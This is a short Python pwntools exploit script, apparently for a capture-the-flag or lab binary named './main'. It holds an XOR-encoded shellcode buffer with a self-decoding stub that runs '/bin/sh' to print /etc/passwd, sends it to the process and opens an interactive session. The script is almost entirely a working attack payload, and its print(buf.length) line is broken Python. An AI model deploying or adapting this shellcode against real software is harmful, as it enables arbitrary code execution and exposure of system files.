from pwn import *

buf =  b""
buf += b"\xeb\x27\x5b\x53\x5f\xb0\x80\xfc\xae\x75\xfd\x57"
buf += b"\x59\x53\x5e\x8a\x06\x30\x07\x48\xff\xc7\x48\xff"
buf += b"\xc6\x66\x81\x3f\x55\xac\x74\x07\x80\x3e\x80\x75"
buf += b"\xea\xeb\xe6\xff\xe1\xe8\xd4\xff\xff\xff\x08\x80"
buf += b"\x40\xb0\x27\x6a\x61\x66\x27\x7b\x60\x08\x91\x58"
buf += b"\x5c\x57\x5a\x6e\x60\x25\x6b\x5c\x56\x5a\xe0\x18"
buf += b"\x08\x08\x08\x6b\x69\x7c\x28\x27\x6d\x7c\x6b\x27"
buf += b"\x78\x69\x7b\x7b\x7f\x6c\x08\x5e\x5f\x5c\x56\x62"
buf += b"\x33\x50\x07\x0d\x55\xac"
print(buf.length)
p = process("./main")

p.send(buf)

p.interactive()
